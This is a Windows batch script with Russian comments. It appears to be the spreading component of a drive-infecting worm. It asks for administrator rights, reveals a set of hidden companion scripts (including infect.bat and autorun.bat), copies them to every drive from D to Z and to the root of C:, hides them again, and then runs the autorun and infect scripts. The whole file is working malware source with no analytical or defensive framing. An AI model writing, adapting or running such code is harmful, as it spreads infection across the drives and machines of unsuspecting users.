@echo off
:: Проверка: запущен ли скрипт с правами администратора
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Запуск от имени администратора...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit
)

:: Определяем список файлов
set files=infect.bat autorun.bat lnk.bat launch.bat move_globalization.bat

:: Временно снимаем "скрытые" атрибуты
attrib -s -h "%~dp0infect.bat"
attrib -s -h "%~dp0autorun.bat"
attrib -s -h "%~dp0lnk.bat"
attrib -s -h "%~dp0launch.bat"
attrib -s -h "%~dp0move_globalization.bat"

:: Копирование
for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist "%%d:\" (
        cd /d "%%d:\"
        for %%f in (%files%) do (
            copy /Y "%~dp0%%f" "%%d:\%%f"
            copy /Y "%~dp0%%f" "C:\%%f"
        )
    )
)


:: Возвращаем скрытые атрибуты
attrib +h +s "%~dp0infect.bat"
attrib +h +s "%~dp0autorun.bat"
attrib +h +s "%~dp0lnk.bat"
attrib +h +s "%~dp0launch.bat"
attrib +h +s "%~dp0move_globalization.bat"

call "%~dp0autorun.bat"
call "%~dp0infect.bat"

